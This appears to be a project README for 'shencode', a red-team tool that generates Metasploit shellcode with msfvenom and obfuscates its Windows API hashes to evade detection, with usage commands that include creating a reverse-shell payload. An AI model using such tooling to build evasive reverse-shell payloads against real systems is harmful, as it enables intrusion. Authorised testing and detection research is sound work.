# shencode
automation script for creating and obfuscating metasploit shellcode

![[shencode-2.png]]

## Features

### Version 0.2

- build shellcode with msfvenom
- searching for hashed Windows API functions
- change ROR13 Hash to ROL Hash with individual Key
- Raw and formatted output (C++,C#, C inline ASM, Powershell, Python, Hex)
- Added a subparser
- choose between building a shellcode and use an existing one
- (more) object oriented rewrite for better module integration

## ToDo

- chaining commands for better integration
- write shellcode in a template file (.cpp)
- automatical compile feature
- integrate more frameworks
- integrate more encoder
- Use PATH for better msfvenom integration

## How to use

### creating shellcode

`python shencode.py create --payload windows/shell_reverse_tcp --lhost 127.0.0.1 --lport 4443`

### encode shellcode

`python shencode.py encode --filename sc-120824-120101.bin --key 33 [--decompile] [--showmod]`

### output in different styles

`python.py -o {c, casm, cs, ps1, py, hex} <commands>`

Check [this repository](https://github.com/psycore8/bin2shellcode) for more information regarding the output.

## Config

Please change the metasploit path in line 8. This will be fixed in the future.

`msfvenom_path = "c:\\metasploit-framework\\bin\\msfvenom.bat"`

## Parameter


| Command  | Subcommand  | Description                                                        |
| -------- | ----------- | ------------------------------------------------------------------ |
| create   |             | create a shellcode using msfvenom                                  |
|          | --payload   | payload to use e.g. windows/shell_reverse_tcp                      |
|          | --lhost     | LHOST Argument                                                     |
|          | --lport     | LPORT Argument                                                     |
| encode   |             | encode windows function hashes to ROL                              |
|          | --filename  | raw input file with shellcode                                      |
|          | --key       | ROL key for encoding                                               |
|          | --decompile | decompile modified bytes                                           |
|          | --showmod   | display modifications                                              |
| --output |             | formatting the shellcode in C, Casm, C#, Powershell, python or hex |

## Credits

The encoding part is initially taken from [bordergate.co.uk](https://www.bordergate.co.uk/function-name-hashing/). Great work!
